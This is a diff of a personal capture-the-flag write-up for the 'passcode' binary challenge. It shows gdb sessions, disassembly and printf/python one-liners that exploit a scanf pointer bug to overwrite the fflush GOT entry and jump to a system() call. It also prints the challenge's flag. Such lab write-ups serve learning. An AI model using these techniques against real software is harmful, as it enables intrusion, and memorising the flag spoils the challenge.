@@ -1,7 +1,7 @@
 
 - OK! So I compiled with symbols - I notices that the program is using scanf, but instead of &int, it used int! That means that the data I will use will change the POINTER and not the VALUE.
 - OK it's payload time:
-printf "%b" '\x42\x42\x42\x42\x0a\x0a\x42\x42\x42\x42\x0a' > data.bin
+`printf "%b" '\x42\x42\x42\x42\x0a\x0a\x42\x42\x42\x42\x0a' > data.bin`
 - Breakpoint time: 'b passcode.c:8'
 - Let's read the pointer of passcode1: 'p/x &passcode1'
 
@@ -45,7 +45,7 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 
 
 - NICE! I managed to pass the first check with the following payload!
-- printf "%b" '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe6\x28\x05\x00' > payload.bin
+- `printf "%b" '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe6\x28\x05\x00' > payload.bin`
 
 - Adding bytes are not allowing me to overright the second value :(
 
@@ -79,27 +79,30 @@ So.. maybe?
 - Let's find them (myself, without the writeup)
 
 - In order to find the fflush pointer, I disassembled my code. I saw the following line:
-call   0x8048430 <fflush@plt>
+`call   0x8048430 <fflush@plt>`
 
 - Using x/i I can see the instruction is:
-0x8048430 <fflush@plt>:	jmp    DWORD PTR ds:0x804a004
+`0x8048430 <fflush@plt>:	jmp    DWORD PTR ds:0x804a004`
 
 - So 0x804a004 is the PLT address 
 
 - Now let's look for the flag line - looking into the disassemble again:
+```
 0x080485e3 <+127>:	mov    DWORD PTR [esp],0x80487af
 0x080485ea <+134>:	call   0x8048460 <system@plt>
+```
 
 - I need to use the line that changes esp before the function call: 0x080485e3
 
 - (saw this on the writeup) I need to pass it as a number, so let's convert 0x080485e3 into decimal: 
-p/d 0x080485e3
+`p/d 0x080485e3`
 
 - Another cool thing I learned, is that python is better then printf in creating payloads!
 
-python -c "print '\x01'*96 + '\x04\xa0\x04\x08' + '134514147'" > payload2.bin
+`python -c "print '\x01'*96 + '\x04\xa0\x04\x08' + '134514147'" > payload2.bin`
 
-- Anddd flag: "Sorry mom.. I got confused about scanf usage :("
+- # Anddd flag: "Sorry mom.. I got confused about scanf usage :("
+- # pwned.
 
 - P.S.
 I am sad that I had to look up a hint, a pretty big one too.. Shouldn't do it next time.
